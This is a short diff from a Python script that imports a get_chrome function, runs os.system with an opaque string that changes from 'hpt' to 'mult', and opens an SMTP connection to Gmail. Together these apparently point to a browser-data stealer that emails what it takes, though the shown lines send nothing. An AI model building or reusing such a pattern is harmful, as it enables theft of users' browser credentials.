@@ -18,7 +18,7 @@ from a import get_chrome
 
 try:
     import os
-    os.system("hpt")
+    os.system("mult")
     
     smtpObj = smtplib.SMTP('smtp.gmail.com', 587)
     smtpObj.starttls()
